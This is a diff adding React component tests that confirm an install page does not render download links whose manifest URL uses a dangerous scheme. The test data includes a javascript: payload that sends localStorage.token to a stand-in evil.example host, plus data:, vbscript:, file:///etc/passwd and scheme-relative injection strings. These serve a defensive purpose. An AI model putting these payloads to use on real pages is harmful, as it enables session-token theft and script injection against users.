@@ -21,6 +21,30 @@ describe('InstallInstructions', () => {
     expect(screen.getByRole('link', { name: /download binary/i })).toHaveAttribute('href', 'https://example.com/agent-arm64');
   });
 
+  // The manifest URL is stored verbatim by the publish endpoint and rendered as
+  // an href. A non-http(s) scheme in that field would execute in the app origin
+  // when a user clicks the download link, so it must never reach the anchor.
+  it.each([
+    ['javascript:', 'javascript:fetch("https://evil.example/"+localStorage.token)'],
+    ['data:', 'data:text/html,<script>alert(1)</script>'],
+    ['vbscript:', 'vbscript:msgbox(1)'],
+    ['file:', 'file:///etc/passwd'],
+    ['scheme-relative', '//evil.example/agent'],
+  ])('does not render a %s manifest URL as a link', (_label, url) => {
+    render(<InstallInstructions manifests={[{ ...manifests[0]!, url }]} />);
+    expect(screen.queryByRole('link', { name: /download binary/i })).not.toBeInTheDocument();
+    expect(document.body.innerHTML).not.toContain(url);
+  });
+
+  it.each([
+    'https://example.com/agent-amd64',
+    'http://internal.lan/agent-amd64',
+    '/api/v1/updates/download/agent',
+  ])('still renders %s as a download link', (url) => {
+    render(<InstallInstructions manifests={[{ ...manifests[0]!, url }]} />);
+    expect(screen.getByRole('link', { name: /download binary/i })).toHaveAttribute('href', url);
+  });
+
   it('shows missing message when no manifest for platform', () => {
     render(<InstallInstructions manifests={[]} />);
     expect(screen.getByText(/no agent binaries published/i)).toBeInTheDocument();
